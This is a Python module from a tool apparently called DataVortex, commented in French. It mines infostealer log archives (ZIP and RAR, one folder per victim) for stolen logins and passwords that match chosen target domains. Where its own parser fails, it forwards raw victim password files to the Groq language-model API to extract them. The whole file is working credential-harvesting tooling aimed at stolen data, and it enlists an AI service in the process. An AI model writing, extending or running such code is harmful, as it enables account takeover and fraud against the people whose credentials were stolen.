"""
DataVortex – Extraction de credentials ciblés dans les archives.

Lit les fichiers passwords.txt / All_Passwords.txt présents dans chaque
dossier victime et filtre les entrées dont le host correspond à l'un des
domaines configurés dans CREDENTIAL_TARGETS (.env).

Format stealer standard attendu (blocs séparés par une ligne vide) :
    Soft: Google Chrome (Default)
    Host: https://passculture.app/
    Login: user@example.com
    Password: s3cr3t

Fonctionne pour les archives ZIP (stdlib) et RAR (rarfile + unrar/bsdtar/unar).
"""

from __future__ import annotations

import os
import re
import shutil
import tempfile
import zipfile
from urllib.parse import urlparse

# ── Noms de fichiers reconnus comme listes de passwords ──────────────────────

_PASSWORD_FILENAMES: frozenset[str] = frozenset({
    "passwords.txt",
    "all passwords.txt",
    "all_passwords.txt",
    "password.txt",
    "all_password.txt",
    "all_pass.txt",
    "pass.txt",
    "passwords",
    "logins.txt",
    "login.txt",
    "credentials.txt",
    # variantes sans extension ou avec espaces
    "all passwords",
    "all_passwords",
    "autofill.txt",
    "autofills.txt",
})


def _decode_content(data: bytes) -> str:
    """
    Détecte l'encodage du fichier et décode correctement.
    Ordre : UTF-16 BOM → UTF-16 LE sans BOM (heuristique) → UTF-8 → latin-1.
    """
    # BOM UTF-16 explicite
    if data[:2] in (b'\xff\xfe', b'\xfe\xff'):
        return data.decode("utf-16", errors="replace")
    # BOM UTF-8
    if data[:3] == b'\xef\xbb\xbf':
        return data.decode("utf-8-sig", errors="replace")
    # Heuristique UTF-16 LE sans BOM :
    # si > 30 % des bytes pairs sont nuls, c'est très probablement UTF-16 LE
    if len(data) >= 8:
        null_even = sum(1 for i in range(0, min(len(data), 200), 2) if data[i + 1] == 0)
        if null_even / (min(len(data), 200) // 2) > 0.30:
            try:
                return data.decode("utf-16-le", errors="replace")
            except Exception:
                pass
    # UTF-8 strict
    try:
        return data.decode("utf-8")
    except UnicodeDecodeError:
        pass
    # Fallback universel
    return data.decode("latin-1", errors="replace")


def _is_password_file(member_name: str) -> bool:
    return os.path.basename(member_name).lower() in _PASSWORD_FILENAMES


# ── Matching de domaine ───────────────────────────────────────────────────────

def _host_matches(host_url: str, targets: list[str]) -> bool:
    """
    Vérifie si l'URL du host contient l'un des domaines cibles.
    Comparaison insensible à la casse, match partiel sur netloc + chemin brut.
    """
    lower = host_url.lower()
    try:
        netloc = urlparse(host_url).netloc.lower()
    except Exception:
        netloc = ""
    for raw in targets:
        t = raw.strip().lower()
        if not t:
            continue
        if t in lower or (netloc and t in netloc):
            return True
    return False


# ── Parseur de blocs passwords ────────────────────────────────────────────────

_FIELD_RE = re.compile(
    r"^(soft|url|host|login|username|user|email|password|pass|passwd)\s*[:\s]\s*(.*)",
    re.IGNORECASE,
)


def parse_password_file(text: str) -> list[dict]:
    """
    Parse un fichier password au format stealer.
    Retourne une liste de dicts {soft, host, login, password}.
    Les blocs sont séparés par des lignes vides ; les champs manquants
    restent des chaînes vides.
    """
    entries: list[dict] = []
    current: dict = {}

    for raw in text.splitlines():
        line = raw.strip()
        if not line:                          # séparateur de bloc
            if current.get("host"):
                entries.append(current)
            current = {}
            continue
        m = _FIELD_RE.match(line)
        if not m:
            continue
        key = m.group(1).lower()
        val = m.group(2).strip()
        if key in ("login", "username", "user", "email"):
            current.setdefault("login", val)
        elif key in ("password", "pass", "passwd"):
            current.setdefault("password", val)
        elif key in ("host", "url"):
            current["host"] = val
        elif key == "soft":
            current["soft"] = val

    if current.get("host"):
        entries.append(current)
    return entries


def _filter_entries(
    entries: list[dict], targets: list[str], file_path: str
) -> list[dict]:
    """Filtre les entrées par cible et exclut les lignes login+password vides."""
    results = []
    for e in entries:
        if not _host_matches(e.get("host", ""), targets):
            continue
        login    = e.get("login", "")
        password = e.get("password", "")
        if not login and not password:
            continue
        results.append({
            "host":      e.get("host", ""),
            "login":     login,
            "password":  password,
            "soft":      e.get("soft", ""),
            "file_path": file_path,
        })
    return results


# ── Extraction ZIP ────────────────────────────────────────────────────────────

def _search_zip(path: str, targets: list[str]) -> tuple[list[dict], str]:
    """Retourne (results, fallback_text) où fallback_text est le texte brut des
    fichiers passwords qui n'ont produit aucun match (pour le fallback Groq)."""
    results: list[dict] = []
    fallback_parts: list[str] = []
    try:
        with zipfile.ZipFile(path, "r") as zf:
            pw_members = [n for n in zf.namelist() if _is_password_file(n)]
            for member in pw_members:
                try:
                    data    = zf.read(member)
                    text    = _decode_content(data)
                    entries = parse_password_file(text)
                    found   = _filter_entries(entries, targets, member)
                    if found:
                        results.extend(found)
                    elif text.strip():
                        # Pas de match standard → garder pour Groq
                        fallback_parts.append(f"# {member}\n{text[:2000]}")
                except Exception:
                    continue
    except Exception:
        pass
    return results, "\n\n".join(fallback_parts[:3])  # max 3 fichiers envoyés à Groq


# ── Extraction RAR ────────────────────────────────────────────────────────────

def _configure_rarfile() -> bool:
    """
    Configure rarfile pour utiliser le premier outil disponible sur le système.
    Retourne True si un outil a été trouvé, False sinon.
    """
    try:
        import rarfile as _rf
    except ImportError:
        return False

    # Ordre de préférence : unar (gère RAR5 sans licence), unrar, bsdtar
    for tool in ("unar", "unrar", "bsdtar"):
        if shutil.which(tool):
            if tool == "unar":
                _rf.ALT_TOOL     = tool
                _rf.USE_ALT_TOOL = True
            else:
                _rf.UNRAR_TOOL = tool
            return True
    return False


def _search_rar(path: str, targets: list[str]) -> tuple[list[dict], str]:
    """
    Extrait et parse les fichiers password depuis un RAR.
    Retourne (results, fallback_text).
    """
    results: list[dict] = []
    fallback_parts: list[str] = []
    try:
        import rarfile as _rf
    except ImportError:
        return results

    if not _configure_rarfile():
        # Pas d'outil d'extraction disponible → listing seul, pas de lecture
        return results, ""

    tmp_dir = tempfile.mkdtemp(prefix="dv_creds_")
    try:
        with _rf.RarFile(path, "r") as rf:
            pw_members = [n for n in rf.namelist() if _is_password_file(n)]
            if not pw_members:
                return results, ""
            # Extraction ciblée : uniquement les fichiers passwords
            rf.extractall(tmp_dir, members=pw_members)

        # Lecture des fichiers extraits
        for root, _, files in os.walk(tmp_dir):
            for fname in files:
                if not _is_password_file(fname):
                    continue
                fpath = os.path.join(root, fname)
                try:
                    with open(fpath, "rb") as fh:
                        raw = fh.read()
                    text = _decode_content(raw)
                    rel  = os.path.relpath(fpath, tmp_dir)
                    entries = parse_password_file(text)
                    found   = _filter_entries(entries, targets, rel)
                    if found:
                        results.extend(found)
                    elif text.strip():
                        fallback_parts.append(f"# {rel}\n{text[:2000]}")
                except Exception:
                    continue
    except Exception:
        pass
    finally:
        shutil.rmtree(tmp_dir, ignore_errors=True)

    return results, "\n\n".join(fallback_parts[:3])


# ── Point d'entrée public ─────────────────────────────────────────────────────

async def search_credentials(
    path: str, filename: str, targets: list[str]
) -> list[dict]:
    """
    Recherche les credentials correspondant aux domaines `targets` dans une
    archive locale `path`.

    1. Tente le parseur standard (regex + détection d'encodage).
    2. Si 0 résultat mais des fichiers passwords ont été trouvés,
       utilise Groq comme fallback pour identifier le format et extraire.

    Retourne une liste de dicts : { host, login, password, soft, file_path }
    """
    if not targets:
        return []

    ext = os.path.splitext(filename.lower())[1]
    if ext == ".zip":
        results, fallback_text = _search_zip(path, targets)
    elif ext == ".rar":
        results, fallback_text = _search_rar(path, targets)
    else:
        return []

    if results:
        return results

    # Fallback Groq : parseur standard n'a rien trouvé mais il y avait du contenu
    if fallback_text.strip():
        try:
            from groq_utils import ask_groq_credentials, key_available
            if key_available():
                groq_results = await ask_groq_credentials(fallback_text, targets)
                for r in groq_results:
                    r.setdefault("file_path", "groq_fallback")
                return groq_results
        except Exception:
            pass

    return []
